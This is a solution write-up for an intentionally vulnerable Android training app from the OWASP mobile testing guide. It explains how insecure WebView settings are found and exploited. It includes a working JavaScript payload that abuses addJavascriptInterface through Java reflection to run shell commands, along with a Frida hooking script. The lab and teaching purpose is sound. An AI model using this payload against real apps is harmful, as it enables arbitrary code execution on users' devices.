# OMTG-Android - 15. WebView Local - Solution

> MSTG-PLATFORM-6: "WebViews are configured to allow only the minimum set of protocol handlers required (ideally, only https is supported). Potentially dangerous handlers, such as file, tel and app-id, are disabled."<br />
> MSTG-PLATFORM-7: "If native methods of the app are exposed to a WebView, verify that the WebView only renders JavaScript contained within the app package."

**Summary of the challenge:** WebView can load local file content from the application data directory or SD card using `file://` URL sheme. Local resource can be triggered and rendered within a WebView object, thus Cross-Site Scripting (XSS) attack can be achieved in case of the JavaScript support is explicitly enabled by `setJavaScriptEnabled(true)` method.<br />
Moreover, a remote code execution vulnerability was discovered in 2012 which affects Android 4.1 (API 16) and prior versions. The issue exists due to the `addJavascriptInterface` function allows the developers to expose Java objects for WebView. Exploiting this vulnerability, a remote attacker can execute malicious code to escalate privileges, install malware on the device or extract sensitive user data by invoking the Android application's native methods via JavaScript.<br />

To identify the vulnerabilities, decompile the APK file using [JADX-GUI](https://github.com/skylot/jadx) and search for `WebView` instances in the source:
```java
public class OMTG_ENV_005_WebView_Local extends AppCompatActivity {
  final class JavaScriptInterface {
    JavaScriptInterface() {
    }
    public String getSomeString() {
      return "string";
    }
  }
  public void onCreate(Bundle savedInstanceState) {
  [...]
    public void onClick(View v) {
      ((WebView) OMTG_ENV_005_WebView_Local.this.findViewById(C0000R.id.webView2)).reload();
    }
    WebView myWebView = (WebView) findViewById(C0000R.id.webView2);
    myWebView.getSettings().setJavaScriptEnabled(true);
    myWebView.getSettings().setAllowFileAccessFromFileURLs(true);
    myWebView.setWebChromeClient(new WebChromeClient());
    myWebView.addJavascriptInterface(new JavaScriptInterface(), "jsinterface");
    myWebView.loadUrl("file:///android_asset/local.htm");
  }
}
```

The application is loading an HTML file named `local.htm` from its `asset` folder. This folder contains resources which are packed into the installer file `app-arm-debug-Android5.apk`. Based on the source code, the following conditions are met:
* JavaScript support is enabled: `setJavaScriptEnabled(true)`
* Running JavaScript is allowed in the context of file scheme URLs: `setAllowFileAccessFromFileURLs(true)`
* A JavaScript native bridge interface is defined between Android Java and JavaScript: `addJavascriptInterface(new JavaScriptInterface(), "jsinterface")`

Content of the triggered `local.htm` file:
```html
<HTML>
[...]
<script>
var String = window.jsinterface.getSomeString();
alert(String);

function execute(cmd){
  return window.jsinterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"mstg\" > /storage/emulated/0/mstg.txt']);
</script>
</body>
</HTML>
```

Tap on the WebView Local button in the challenge to execute the malicious JavaScript snippets. An alert box returns with a string, which is gained from the Java source:

<img src="https://user-images.githubusercontent.com/55597077/67219684-5c871c00-f420-11e9-8902-0863be412532.png" width="296">

To exploit both issues mentioned above in the summary paragraph, it is required to run the application on Android 4.1 (API 16) and make sure the SD card can be accessed on the location: `/storage/emulated/0/`.

<img src="https://user-images.githubusercontent.com/55597077/67219686-5d1fb280-f420-11e9-85f3-eea03ec9ffbd.png" width="296">

A text file named `mstg.txt` is created on the SD card by executing the `/system/bin/sh -c 'echo mstg > /storage/emulated/0/mstg.txt'` command:
```bash
root@android:/storage/emulated/0/ # ls -la
d--------- root     root               2019-10-21 14:21 .android_secure
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Alarms
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Android
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 DCIM
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Download
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 LOST.DIR
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Movies
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Music
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Notifications
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Pictures
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Podcasts
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Ringtones
----rwxr-x system   sdcard_rw        5 2019-10-21 14:45 mstg.txt
root@android:/storage/emulated/0/ # cat mstg.txt
mstg
```

The following Frida script `15_webview_local.js` hooks the `android.webkit.WebView` class to print all the URLs are loaded into WebView objects and identify the Java object's methods are accessible from JavaScript to execute arbitrary codes on Java level:
```javascript
Java.perform(function() {
  
  var WebView = Java.use("android.webkit.WebView");
  
  //Loads the given URL
  //WebView.loadUrl (String url)
  WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
    console.log("[*] Loaded URL into WebView: " + url);
    this.loadUrl.overload('java.lang.String').call(this, url);
   };
  //WebView.loadUrl (String url, Map<String, String> additionalHttpHeaders)
  WebView.loadUrl.overload('java.lang.String', 'java.util.Map').implementation = function(url, additionalHttpHeaders) {
    console.log("[*] Loaded URL into WebView: " + url);
    this.loadUrl.overload('java.lang.String', 'java.util.Map').call(this, url, additionalHttpHeaders);
   };
   
  //Injects the supplied Java object into this WebView. The object is injected into all frames of the web page, including all the iframes, using the supplied name.
  //WebView.addJavascriptInterface (Object object, String name)
  WebView.addJavascriptInterface.overload('java.lang.Object','java.lang.String').implementation = function(object, name) {
    console.log("[*] Java object's methods is accessed from JavaScript: " + name);
    this.addJavascriptInterface.overload('java.lang.Object','java.lang.String').call(this, object, name);
   };
});
```

Frida console output:
```bash
C:\>frida -U sg.vp.owasp_mobile.omtg_android -l 15_webview_local.js --no-pause
     ____
    / _  |   Frida 12.6.1 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at http://www.frida.re/docs/home/

[Motorola MotoG3::sg.vp.owasp_mobile.omtg_android]-> 
[*] Java object's methods is accessed from JavaScript: jsinterface
[*] Loaded URL into WebView: file:///android_asset/local.htm
```
